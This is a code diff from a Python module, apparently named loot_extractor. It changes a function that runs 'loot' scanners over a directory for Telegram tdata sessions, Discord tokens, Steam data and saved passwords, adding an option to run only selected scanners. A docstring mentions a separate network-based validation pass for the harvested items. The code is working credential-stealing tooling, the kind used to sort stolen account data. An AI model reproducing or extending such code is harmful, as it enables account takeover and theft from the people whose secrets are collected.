@@ -765,31 +765,44 @@ def scan_passwords(root: str) -> List[CredentialEntry]:
 # ════════════════════════════════════════════════════════════════════
 
 
-def scan_directory_for_loot(root: str) -> LootResult:
-    """Run every loot scanner over *root* and return the aggregated
-    result. This is filesystem-only — see :func:`validate_loot_async`
-    for the network-based validation pass."""
+def scan_directory_for_loot(
+    root: str,
+    buckets: "frozenset[str] | None" = None,
+) -> LootResult:
+    """Run every (or selected) loot scanner over *root* and return the
+    aggregated result.
+
+    *buckets* is an optional frozenset of bucket identifiers (e.g.
+    ``{"loot_tdata", "loot_discord"}``).  When ``None`` or empty **all**
+    scanners run.  Pass specific bucket constants from
+    ``services.loot_extractor`` to limit the scan.
+    """
+    run_all = not buckets
     result = LootResult()
-    try:
-        result.tdata = scan_tdata(root)
-    except Exception as exc:
-        logger.exception("scan_tdata failed")
-        result.errors.append(f"tdata scan failed: {exc}")
-    try:
-        result.discord = scan_discord_tokens(root)
-    except Exception as exc:
-        logger.exception("scan_discord_tokens failed")
-        result.errors.append(f"discord scan failed: {exc}")
-    try:
-        result.steam = scan_steam(root)
-    except Exception as exc:
-        logger.exception("scan_steam failed")
-        result.errors.append(f"steam scan failed: {exc}")
-    try:
-        result.credentials = scan_passwords(root)
-    except Exception as exc:
-        logger.exception("scan_passwords failed")
-        result.errors.append(f"password scan failed: {exc}")
+    if run_all or "loot_tdata" in buckets:
+        try:
+            result.tdata = scan_tdata(root)
+        except Exception as exc:
+            logger.exception("scan_tdata failed")
+            result.errors.append(f"tdata scan failed: {exc}")
+    if run_all or "loot_discord" in buckets:
+        try:
+            result.discord = scan_discord_tokens(root)
+        except Exception as exc:
+            logger.exception("scan_discord_tokens failed")
+            result.errors.append(f"discord scan failed: {exc}")
+    if run_all or "loot_steam" in buckets:
+        try:
+            result.steam = scan_steam(root)
+        except Exception as exc:
+            logger.exception("scan_steam failed")
+            result.errors.append(f"steam scan failed: {exc}")
+    if run_all or "loot_passwords" in buckets:
+        try:
+            result.credentials = scan_passwords(root)
+        except Exception as exc:
+            logger.exception("scan_passwords failed")
+            result.errors.append(f"password scan failed: {exc}")
     return result
 
 
